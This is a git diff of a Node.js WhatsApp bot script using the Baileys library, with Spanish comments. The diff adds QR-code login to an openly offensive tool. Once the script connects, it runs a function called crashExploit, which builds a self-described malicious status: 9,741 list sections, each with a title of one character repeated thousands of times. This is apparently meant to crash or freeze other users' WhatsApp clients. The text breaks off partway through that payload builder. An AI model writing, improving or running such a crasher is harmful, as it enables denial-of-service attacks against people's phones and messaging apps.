@@ -1,16 +1,11 @@
 const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateWAMessageFromContent } = require("@whiskeysockets/baileys");
 const P = require("pino");
 const fs = require("fs");
+const QRCode = require("qrcode-terminal");
 
-// ========== LEE EL NÚMERO DESDE VARIABLE DE ENTORNO ==========
-const PHONE_NUMBER = process.env.PHONE_NUMBER;
-if (!PHONE_NUMBER) {
-    console.error("❌ ERROR: Debes configurar PHONE_NUMBER en las variables de entorno.");
-    console.error("📌 Ejemplo: PHONE_NUMBER=521234567890");
-    process.exit(1);
-}
-
-console.log(`📱 Usando número: ${PHONE_NUMBER}`);
+// ========== LEE EL NÚMERO (opcional, solo para pairing) ==========
+// Si usas QR, no es necesario, pero lo dejamos por si acaso
+const PHONE_NUMBER = process.env.PHONE_NUMBER || "";
 
 async function start() {
     const { state, saveCreds } = await useMultiFileAuthState("auth");
@@ -20,17 +15,26 @@ async function start() {
         auth: state,
         version,
         logger: P({ level: "silent" }),
-        browser: ["Ubuntu", "Chrome", "120.0.0"]
+        browser: ["Ubuntu", "Chrome", "120.0.0"],
+        printQRInTerminal: true  // ✅ Esto muestra el QR en la consola
     });
 
     sock.ev.on("creds.update", saveCreds);
 
     sock.ev.on("connection.update", async (update) => {
-        const { connection, lastDisconnect } = update;
+        const { connection, lastDisconnect, qr } = update;
+
+        // ✅ Mostrar QR en la consola (por si no se imprime automáticamente)
+        if (qr) {
+            console.log("\n📲 ESCANEA ESTE QR CON WHATSAPP (Dispositivos vinculados > Vincular con código QR)\n");
+            QRCode.generate(qr, { small: true });
+        }
+
         if (connection === "open") {
             console.log("\n✅ Conectado a WhatsApp\n");
             await crashExploit(sock);
         }
+
         if (connection === "close") {
             const reason = lastDisconnect?.error?.output?.statusCode;
             if (reason !== DisconnectReason.loggedOut) {
@@ -42,18 +46,20 @@ async function start() {
         }
     });
 
-    if (!sock.authState.creds.registered) {
+    // Si no hay credenciales y no se generó QR automáticamente, intentar pairing
+    if (!sock.authState.creds.registered && !process.env.SKIP_PAIRING) {
         try {
             const code = await sock.requestPairingCode(PHONE_NUMBER);
-            console.log("\n🔑 Código de vinculación:", code);
-            console.log("📲 Abre WhatsApp > Dispositivos vinculados > Vincular con código de 8 dígitos\n");
+            console.log("\n🔑 Código de vinculación (alternativo):", code);
+            console.log("📲 Usa este código si el QR no funciona.\n");
         } catch (e) {
-            console.log("❌ Error al solicitar pairing:", e.message);
+            console.log("❌ El QR debería estar disponible en los logs. Escanéalo para conectar.");
         }
     }
 }
 
 async function crashExploit(sock) {
+    // ========== CREAR EL ESTADO MALICIOSO ==========
     const delaymention = Array.from({ length: 9741 }, (_, r) => ({
         title: "᭯".repeat(9741),
         rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
